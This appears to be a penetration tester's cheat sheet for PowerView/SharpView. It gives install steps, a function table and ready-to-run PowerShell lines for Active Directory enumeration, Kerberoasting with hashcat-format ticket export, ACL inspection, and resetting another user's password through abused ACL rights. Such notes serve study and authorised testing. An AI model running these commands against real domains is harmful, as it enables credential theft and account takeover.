==Powerview/SharpView== [Hacktricks](https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/powerview.html?highlight=powerview#powerviewsharpview)

PowerView is a powerful suite of PowerShell tools for Active Directory enumeration and compromise.

## Setup:
#### Install:
1. ```Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "PowerView.ps1"```
2. `Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned` ==Adjust execution policy so you can run the command

#### Import: So you can run it
```powershell
Terminal>. .\PowerView.ps1
```


| **Command**                         | **Description**                                                                            |
| ----------------------------------- | ------------------------------------------------------------------------------------------ |
| `Export-PowerViewCSV`               | Append results to a CSV file                                                               |
| `ConvertTo-SID`                     | Convert a User or group name to its SID value                                              |
| `Get-DomainSPNTicket`               | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account          |
| **Domain/LDAP Functions:**          |                                                                                            |
| `Get-Domain`                        | Will return the AD object for the current (or specified) domain                            |
| ==`Get-DomainController`==          | Return a list of the Domain Controllers for the specified domain                           |
| ==`Get-DomainUser`==                | Will return all users or specific user objects in AD                                       |
| `Get-DomainComputer`                | Will return all computers or specific computer objects in AD                               |
| `Get-DomainGroup`                   | Will return all groups or specific group objects in AD                                     |
| `Get-DomainOU`                      | Search for all or specific OU objects in AD                                                |
| `Find-InterestingDomainAcl`         | Finds object ACLs in the domain with modification rights set to non-built in objects       |
| `Get-DomainGroupMember`             | Will return the members of a specific domain group                                         |
| `Get-DomainFileServer`              | Returns a list of servers likely functioning as file servers                               |
| `Get-DomainDFSShare`                | Returns a list of all distributed file systems for the current (or specified) domain       |
| `Get-DomainObjectACL`               | Get the ACL of an object                                                                   |
| **GPO Functions:**                  |                                                                                            |
| `Get-DomainGPO`                     | Will return all GPOs or specific GPO objects in AD                                         |
| `Get-DomainPolicy`                  | Returns the default domain policy or the domain controller policy for the current domain   |
| **Computer Enumeration Functions:** |                                                                                            |
| `Get-NetLocalGroup`                 | Enumerates local groups on the local or a remote machine                                   |
| `Get-NetLocalGroupMember`           | Enumerates members of a specific local group                                               |
| `Get-NetShare`                      | Returns open shares on the local (or a remote) machine                                     |
| `Get-NetSession`                    | Will return session information for the local (or a remote) machine                        |
| `Test-AdminAccess`                  | Tests if the current user has administrative access to the local (or a remote) machine     |
| **Threaded 'Meta'-Functions:**      |                                                                                            |
| `Find-DomainUserLocation`           | Finds machines where specific users are logged in                                          |
| `Find-DomainShare`                  | Finds reachable shares on domain machines                                                  |
| `Find-InterestingDomainShareFile`   | Searches for files matching specific criteria on readable shares in the domain             |
| `Find-LocalAdminAccess`             | Find machines on the local domain where the current user has local administrator access    |
| **Domain Trust Functions:**         |                                                                                            |
| `Get-DomainTrust`                   | Returns domain trusts for the current domain or a specified domain                         |
| `Get-ForestTrust`                   | Returns all forest trusts for the current forest or a specified forest                     |
| `Get-DomainForeignUser`             | Enumerates users who are in groups outside of the user's domain                            |
| `Get-DomainForeignGroupMember`      | Enumerates groups with users outside of the group's domain and returns each foreign member |
| `Get-DomainTrustMapping`            | Will enumerate all trusts for the current domain and any others seen.                      |

```powershell
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol # Enumerate user information

Get-DomainGroupMember -Identity <groupname> -Recurse # Get all members of a group

Get-DomainTrustMapping # Enumerate domain trusts

Test-AdminAccess -ComputerName <computername>

1. Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName # Get Kerberoastable users (Service Accts with SPN)

2. Get-DomainUser -Identity <user> | Get-DomainSPNTicket       -Format hashcat # After finding a kerberoastable user, request their ticket in hashcat format

3. Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
# Request all users and export tickets to a file in hashcat format

```

# Access Control Lists
```powershell

$sid = Convert-NameToSid <user> # Get SID from username
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq <sid> } # Get ACL of user via sid

$guid= <GUID> 
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl # Get object from GUID

Get-DomainObjectACL -ResolveGUIDs -Identity <identity of interest or wildcard> | ? {$_.SecurityIdentifier -eq $sid} # Combine previous steps, resolve GUID in command

foreach($line in [System.IO.File]::ReadLines(<valid_users_file>)) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<domain>\\<user>'}} # List powers we have as the specified user

Set-DomainUserPassword -Identity <target username> -AccountPassword <new pscredential object> -Credential <user with privileges pscredential object> -Verbose # Reset another users' password using our ACL powers

```

PowerView is now maintained by BC-Security, who have taken over the Powershell Empire project and its GUI Starkiller. Additionally, another fork exists written in C# under the name [[SharpView]].
